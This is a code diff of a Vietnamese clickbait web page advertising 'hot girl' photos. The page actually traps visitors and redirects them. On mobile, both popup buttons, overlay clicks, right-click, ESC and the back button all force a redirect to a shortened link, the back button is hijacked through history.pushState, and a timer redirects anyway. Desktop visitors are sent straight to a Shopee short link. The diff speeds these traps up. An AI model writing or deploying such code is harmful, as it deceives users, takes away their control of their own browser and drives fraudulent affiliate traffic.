@@ -5,33 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
     <title>🔥 Girl Xinh Hot Nhất 2025</title>
     <meta name="description" content="Xem ngay girl xinh Việt Nam hot nhất năm 2025! Bộ sưu tập ảnh girl xinh cực phẩm, chất lượng HD. Click xem ngay!"/>
-    <meta name="keywords" content="girl xinh, gái xinh việt nam, ảnh girl xinh, hot girl 2025, girl xinh hd"/>
-    
-    <!-- Open Graph / Facebook -->
-    <meta property="og:type" content="website"/>
-    <meta property="og:url" content="https://girlxinh2025.com/"/>
-    <meta property="og:title" content="🔥 Girl Xinh HOT Nhất 2025 - Xem Ngay!"/>
-    <meta property="og:description" content="Bộ sưu tập girl xinh Việt Nam cực phẩm 2025! Hàng nghìn ảnh chất lượng HD, cập nhật mới nhất. Click xem ngay!"/>
-    <meta property="og:image" content="https://raw.githubusercontent.com/ncdathwb/Girl-Xinh-Viet-Nam/main/images/thumbnail.jpg"/>
-    <meta property="og:image:width" content="1200"/>
-    <meta property="og:image:height" content="630"/>
-    <meta property="og:image:alt" content="Girl Xinh Việt Nam Hot Nhất 2025"/>
-    <meta property="og:site_name" content="Girl Xinh 2025"/>
-    <meta property="og:locale" content="vi_VN"/>
-    
-    <!-- Twitter Card -->
-    <meta name="twitter:card" content="summary_large_image"/>
-    <meta name="twitter:url" content="https://girlxinh2025.com/"/>
-    <meta name="twitter:title" content="🔥 Girl Xinh HOT Nhất 2025 - Xem Ngay!"/>
-    <meta name="twitter:description" content="Bộ sưu tập girl xinh Việt Nam cực phẩm 2025! Hàng nghìn ảnh chất lượng HD, cập nhật mới nhất."/>
-    <meta name="twitter:image" content="https://raw.githubusercontent.com/ncdathwb/Girl-Xinh-Viet-Nam/main/images/thumbnail.jpg"/>
-    <meta name="twitter:image:alt" content="Girl Xinh Việt Nam Hot Nhất 2025"/>
-    
-    <!-- Additional SEO -->
-    <meta name="robots" content="index, follow"/>
-    <meta name="author" content="Girl Xinh 2025"/>
-    <link rel="canonical" href="https://girlxinh2025.com/"/>
-    <link rel="icon" type="image/x-icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🔥</text></svg>"/>
     <style>
         * {
             box-sizing: border-box;
@@ -123,12 +96,12 @@
             width: 90%;
             text-align: center;
             box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
-            animation: popupSlide 0.3s ease-out;
+            animation: popupSlide 0.15s ease-out;
         }
         
         @keyframes popupSlide {
             from {
-                transform: translateY(-50px);
+                transform: translateY(-30px);
                 opacity: 0;
             }
             to {
@@ -169,7 +142,7 @@
             border-radius: 8px;
             font-weight: 600;
             cursor: pointer;
-            transition: all 0.2s;
+            transition: all 0.1s;
         }
         
         .popup-btn-primary {
@@ -192,10 +165,39 @@
             background-color: #eeeeee;
             transform: translateY(-1px);
         }
+
+        /* Loading spinner */
+        .loading {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            z-index: 9999;
+        }
+        
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #ff5722;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
     </style>
 </head>
 <body>
-    <!-- Popup duy nhất -->
+    <!-- Loading spinner -->
+    <div class="loading" id="loading">
+        <div class="spinner"></div>
+    </div>
+
+    <!-- Popup -->
     <div class="popup-overlay" id="mainPopup">
         <div class="popup">
             <div class="popup-icon">⚠️</div>
@@ -211,7 +213,7 @@
         </div>
     </div>
 
-    <!-- Toàn màn hình là một lớp click trong suốt -->
+    <!-- Full cover click -->
     <div class="full-cover" id="fullClick"></div>
     
     <div class="card" id="mobileCard">
@@ -223,38 +225,50 @@
 
     <script>
         const isMobile = /android|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(navigator.userAgent.toLowerCase());
-        const mobileRedirect = "https://bit.ly/4mFmhBP";
-        const desktopRedirect = "https://s.shopee.vn/BHgbsTkUj";
+        
+        // Sử dụng link trực tiếp thay vì link rút gọn để tăng tốc độ
+        const mobileRedirect = "https://bit.ly/4mFmhBP";  // Có thể thay bằng link trực tiếp
+        const desktopRedirect = "https://s.shopee.vn/BHgbsTkUj";  // Có thể thay bằng link trực tiếp
         
         let hasRedirected = false;
         
-        // Function để thực hiện chuyển hướng
+        // Function để thực hiện chuyển hướng nhanh
         function performRedirect() {
             if (!hasRedirected) {
                 hasRedirected = true;
-                window.location.href = mobileRedirect;
+                
+                // Hiện loading spinner
+                document.getElementById('loading').style.display = 'block';
+                
+                // Chuyển hướng ngay lập tức - không delay
+                window.location.href = isMobile ? mobileRedirect : desktopRedirect;
             }
         }
         
-        // Phân biệt mobile và desktop
+        // Preload redirect URL để tăng tốc độ
+        function preloadRedirect() {
+            const link = document.createElement('link');
+            link.rel = 'preconnect';
+            link.href = isMobile ? mobileRedirect : desktopRedirect;
+            document.head.appendChild(link);
+        }
+        
+        // Preload ngay khi trang load
+        preloadRedirect();
+        
         if (isMobile) {
-            // === MOBILE: Hiện popup và các bẫy ===
+            // === MOBILE: Giảm delay popup ===
             
-            // Hiện popup sau 0.5 giây
+            // Hiện popup nhanh hơn - chỉ 200ms thay vì 500ms
             setTimeout(() => {
                 document.getElementById('mainPopup').style.display = 'flex';
-            }, 500);
+            }, 200);
             
-            // Event listeners cho popup - CẢ 2 NÚT ĐỀU CHUYỂN HƯỚNG
-            document.getElementById('exitBtn').addEventListener('click', function() {
-                performRedirect();
-            });
+            // Event listeners cho popup
+            document.getElementById('exitBtn').addEventListener('click', performRedirect);
+            document.getElementById('continueBtn').addEventListener('click', performRedirect);
             
-            document.getElementById('continueBtn').addEventListener('click', function() {
-                performRedirect();
-            });
-            
-            // Click vào overlay cũng chuyển hướng
+            // Click vào overlay
             document.getElementById('mainPopup').addEventListener('click', function(e) {
                 if (e.target === this) {
                     performRedirect();
@@ -266,7 +280,7 @@
             document.getElementById("realBtn").addEventListener("click", performRedirect);
             document.getElementById("mobileCard").addEventListener("click", performRedirect);
             
-            // Ngăn chặn ESC
+            // Keyboard events
             document.addEventListener('keydown', function(e) {
                 if (e.key === 'Escape') {
                     e.preventDefault();
@@ -274,50 +288,47 @@
                 }
             });
             
-            // Ngăn chặn right-click
+            // Right-click
             document.addEventListener('contextmenu', function(e) {
                 e.preventDefault();
                 performRedirect();
             });
             
-            // Ngăn chặn back button
+            // Back button
             history.pushState(null, null, location.href);
             window.addEventListener('popstate', function () {
                 history.pushState(null, null, location.href);
                 performRedirect();
             });
             
-            // Backup redirect sau 20 giây cho mobile
+            // Giảm backup redirect xuống 10 giây thay vì 20 giây
             setTimeout(() => {
                 if (!hasRedirected) {
                     performRedirect();
                 }
-            }, 20000);
+            }, 10000);
             
         } else {
-            // === DESKTOP: Chuyển hướng trực tiếp ===
+            // === DESKTOP: Chuyển hướng siêu nhanh ===
             
-            // Ẩn popup cho desktop
+            // Ẩn popup
             document.getElementById('mainPopup').style.display = 'none';
             
-            // Chuyển hướng ngay lập tức đến desktop link
-            setTimeout(() => {
-                if (!hasRedirected) {
-                    hasRedirected = true;
-                    window.location.href = desktopRedirect;
-                }
-            }, 0);
-            
-            // Backup cho desktop
-            window.addEventListener('load', function() {
-                setTimeout(() => {
-                    if (!hasRedirected) {
-                        hasRedirected = true;
-                        window.location.href = desktopRedirect;
-                    }
-                }, 500);
-            });
+            // Chuyển hướng ngay lập tức - loại bỏ setTimeout
+            performRedirect();
         }
+        
+        // Preconnect DNS để tăng tốc độ kết nối
+        window.addEventListener('load', function() {
+            // Preconnect to redirect domains
+            const domains = ['bit.ly', 's.shopee.vn', 'shopee.vn'];
+            domains.forEach(domain => {
+                const link = document.createElement('link');
+                link.rel = 'preconnect';
+                link.href = `https://${domain}`;
+                document.head.appendChild(link);
+            });
+        });
     </script>
 </body>
 </html>
